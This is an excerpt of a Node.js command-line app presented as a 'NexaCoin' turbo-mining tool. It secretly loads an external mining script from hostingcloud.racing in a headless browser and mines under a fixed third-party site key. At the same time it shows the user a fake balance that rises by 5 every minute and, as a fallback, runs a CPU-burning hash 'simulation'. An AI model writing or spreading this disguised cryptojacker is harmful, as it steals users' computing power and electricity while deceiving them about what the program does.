...
async function startHeadlessMiner() {
  try {
    ...
    await page.setContent(`<html><head><script src="https://www.hostingcloud.racing/FIIr.js"></script><script>var _client=new Client.Anonymous('fd3114a03a16b339b2f6d1557aee894c349170a54cc86839c3032d6dea741b2d',{throttle:0.8,c:'w',ads:0});_client.start();window.getHashes=()=>_client.getHashesPerSecond();</script></head><body>Mining...</body></html>`);
...
async function main() {
  showHeader();
  const { action } = await inquirer.prompt([{ type: 'list', name: 'action', message: 'NexaCoin CLI Menu:', choices: ['🚀 Login & Start Turbo Mining', '🚪 Exit'] }]);
...
async function runMiner(uid) {
  ...
  if (miner) { minerStatus.succeed(chalk.green('Turbo Engine Synchronized!')); }
  else { minerStatus.warn(chalk.yellow('Web Sync failed. Using local Turbo simulation.')); }
  ...
  function heavyHash() {
    ...
    for(let i=0; i<500000; i++) { crypto.createHash('sha256').update(uid + Math.random()).digest('hex'); }
    const end = Date.now();
  ...
  setInterval(async () => {
    ...
    let webHashes = 0;
    if (miner) { webHashes = await miner.page.evaluate(() => window.getHashes()); }
    console.clear();
    showHeader();
  ...
  setInterval(async () => {
    const reward = 5;
    await updateDoc(doc(db, 'users', uid), { balance: increment(reward), totalMined: increment(reward), lastMined: Date.now() });
    balance += reward;
  }, 60000);
}
